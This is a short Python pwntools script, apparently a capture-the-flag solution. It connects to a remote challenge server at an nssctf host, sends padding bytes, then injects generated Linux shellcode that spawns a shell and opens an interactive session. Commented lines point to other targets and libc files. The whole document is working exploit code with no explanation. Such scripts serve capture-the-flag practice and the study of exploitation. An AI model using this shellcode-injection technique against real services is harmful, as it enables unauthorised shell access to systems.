from pwn import *

# context(os='linux', arch='amd64')
# p = process('./ret2text')
p = remote('node5.anna.nssctf.cn', 28199)
# p = remote('week-1.hgame.lwsec.cn', 30704)
# elf = ELF('./ret2text')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('./pwn/libc-2.31.so')
context(arch='amd64', os='linux')
shellcode=asm(shellcraft.sh())
p.send(b'aaaaa')
p.sendline(shellcode)
p.interactive()
